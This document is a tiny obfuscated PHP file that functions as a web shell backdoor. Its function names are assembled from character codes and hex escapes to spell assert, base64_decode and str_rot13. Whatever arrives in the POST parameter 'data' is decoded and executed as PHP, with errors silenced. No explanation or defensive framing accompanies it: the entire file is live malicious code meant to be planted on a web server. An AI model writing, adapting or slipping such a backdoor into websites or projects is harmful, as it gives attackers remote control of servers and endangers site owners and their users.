<?php 
$ohx=chr(97)."s".chr(115).chr(101)."\x72"."t";$twu="b".chr(97)."\x73"."\x65"."6".chr(52)."\x5f"."d".chr(101)."c"."\x6f"."d"."\x65";$ye="s"."t"."\x72"."\x5f"."r"."\x6f"."t"."1".chr(51);@$ohx(@$twu(@$ye($_POST[chr(100)."a"."\x74"."\x61"])));die();
